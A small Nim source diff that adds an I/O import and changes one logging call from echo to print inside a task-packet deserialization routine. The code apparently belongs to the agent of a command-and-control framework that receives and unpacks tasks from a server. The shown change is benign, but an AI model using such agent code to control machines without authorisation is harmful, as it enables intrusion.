@@ -1,6 +1,7 @@
 import strutils, tables, json, strformat, zippy
 
 import ./result
+import ../core/io
 import ../../modules/manager
 import ../../common/[types, serialize, sequence, crypto, utils]
 
@@ -61,7 +62,7 @@ proc deserializePacket*(ctx: AgentCtx, packet: string): seq[Task] =
     var unpacker = Unpacker.init(packet) 
 
     var taskCount = unpacker.getUint8()
-    echo fmt"[*] Response contained {taskCount} tasks."
+    print fmt"[*] Response contained {taskCount} tasks."
     if taskCount <= 0: 
         return @[]
 
